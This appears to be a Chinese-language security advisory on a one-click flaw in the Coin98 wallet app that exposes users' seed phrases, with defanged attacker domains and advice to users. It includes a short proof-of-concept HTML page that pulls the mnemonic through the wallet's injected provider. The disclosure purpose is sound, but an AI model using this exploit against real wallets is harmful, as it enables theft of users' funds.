# Coin98 钱包APP的1-Click助记词窃取漏洞正在被在野利用
## 漏洞危害
只要在钱包APP中打开一个恶意 DApp, 就会导致助记词被窃取

使用 DeepLink 可以打开钱包APP并导向恶意 DApp, 也就是说, 只要 1 次点击, 就会使你的助记词被窃取!
```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <script>
      (async function () {
        const j1 = await window.ethereum.request({ method: "santinizeKey" });
        alert(JSON.stringify(j1));
      })();
    </script>
  </body>
</html>
```
![](1.png)

## IoC
攻击者域名请不要点击:
https://coin98[.]fun     --> 钓鱼页面

https://aicoinhk[.].com  --> 攻击者接收助记词的服务器

## 对 Coin98 钱包用户的建议
* 立刻停用 Coin98 钱包, 转向其它钱包
* 近期如果点击过不明链接, 立刻转移你的资产到其它钱包